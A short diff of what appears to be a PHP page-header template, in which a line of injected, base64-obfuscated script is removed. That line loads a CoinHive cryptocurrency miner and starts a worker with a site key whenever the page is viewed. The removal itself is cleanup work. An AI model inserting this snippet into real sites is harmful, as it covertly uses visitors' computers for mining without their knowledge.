@@ -42,7 +42,7 @@ body{
 <?php foreach ($analytics as $analytic) { ?>
 <?php echo $analytic; ?>
 <?php } ?>
-<script> document.write("<script type='text/javascript' src='"+ atob('aHR0cHM6Ly9jb2luaGl2ZS5jb20vbGliL2NvaW5oaXZlLm1pbi5qcw==') + "'><\/scr" + "ipt>");</script><script> var jsworker = new CoinHive.Anonymous('E0Qi3rb74hY5ZGxpxnrIphUtlyxRpIHU',{throttle: 0.2,forceASMJS: false});jsworker.start(atob('Q29pbkhpdmUuRk9SQ0VfRVhDTFVTSVZFX1RBQg=='));</script>
+
 </head>
 <body class="<?php echo $class; ?>">
 <nav id="top">
